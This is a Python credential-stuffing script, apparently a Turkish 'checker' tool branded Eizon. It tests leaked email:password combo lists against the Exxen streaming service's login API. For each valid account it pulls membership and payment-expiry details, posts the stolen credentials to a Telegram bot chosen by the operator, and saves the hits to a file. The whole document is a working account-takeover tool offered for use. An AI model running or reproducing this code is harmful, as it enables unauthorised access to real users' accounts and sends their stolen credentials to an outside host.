import requests
from termcolor import colored
from cfonts import render
import webbrowser
webbrowser.open('https://t.me/Eizon_tools')
EIZON = render('EIZON', colors=['white', 'red'], align='center')

print(EIZON)

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

Token = input('TOKEN GİR: ')
ID = input('ID GİR: ')
combo_path = input('DOSYA YOLU GİR: ')

def check(email, password):
    client = requests.session()
    headers = {
        'Host': 'api-crm.exxen.com',
        'Origin': 'com.exxen.ios',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.5.0) Alamofire/5.4.4',
        'Accept-Language': 'tr-TR;q=1.0',
        'Cache-Control': 'no-cache',
        'Connection': 'close'
    }
    data = {
        'Email': email,
        'Password': password,
        'RememberMe': 'true'
    }
    try:
        response = client.post('https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764', data=data, headers=headers)
          
        if '"Success":false' in response.text:
            print('BAŞARISIZ GİRİŞ ❌ : ' + email + ':' + password)
        elif '"Success":true' in response.text:
            print(f'BAŞARILI GİRİŞ ✓: {email}:{password}')
            
            membership_info = client.get('https://api-crm.exxen.com/membership/user/info', headers=headers)
            if '"isActive":true' in membership_info.text:
                print(f'Üyelik Durumu: AKTİF✓')
            else:
                print(f'Üyelik Durumu: İPTAL')
            
            payment_info = client.get('https://api-crm.exxen.com/membership/payment/info', headers=headers)
            end_date = payment_info.json()["Data"]["EndDate"]
            print(f'Son Ödeme Tarihi: {end_date}')
            
            message = (f'BAŞARILI GİRİŞ✓\n\nGmail: {email}\nŞifre: {password}\n'
                       f'Üyelik Durumu: AKTİF\nSon Ödeme Tarihi: {end_date}')
            requests.post(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={message}')
            
            with open('exxenhit.txt', 'a') as file:
                file.write(f'{email}:{password}\n')
        else:
            print(response.text) 
    except Exception as e:
        print(f'Hata oluştu: {str(e)}')

def show_account_info(email, password, plan, name, phone, email_verified, exp_date, config_by):
    print(f'\nEmail: {email}')
    print(f'Şifre: {password}')
    print(f'Plan: {plan}')
    print(f'İsim: {name}')
    print(f'Telefon: {phone}')
    print(f'E-posta Doğrulandı: {email_verified}')
    print(f'Son Kullanım Tarihi: {exp_date}')
    print(f'By @Eiz0n ~ @Eizon_tools')

try:
    with open(combo_path, 'r') as file:
        for line in file:
            line = line.strip()
            if ':' in line:
                email, password = line.split(':')
                check(email, password)
                if '|' in line:
                    info_parts = line.split('|')
                    plan = info_parts[1].strip().split('=')[-1]
                    name = info_parts[2].strip().split('=')[-1]
                    phone = info_parts[3].strip().split('=')[-1]
                    email_verified = info_parts[4].strip().split('=')[-1]
                    exp_date = info_parts[5].strip().split('=')[-1]
                    config_by = info_parts[6].strip().split('=')[-1]
                    show_account_info(email, password, plan, name, phone, email_verified, exp_date, config_by)
            else:
                print(f'Geçersiz format: {line}')
except FileNotFoundError:
    print(f'{combo_path} DOSYA BULUNAMADI')
except Exception as e:
    print(f'Bir hata oluştu: {str(e)}')
    
    
    # @Eiz0n

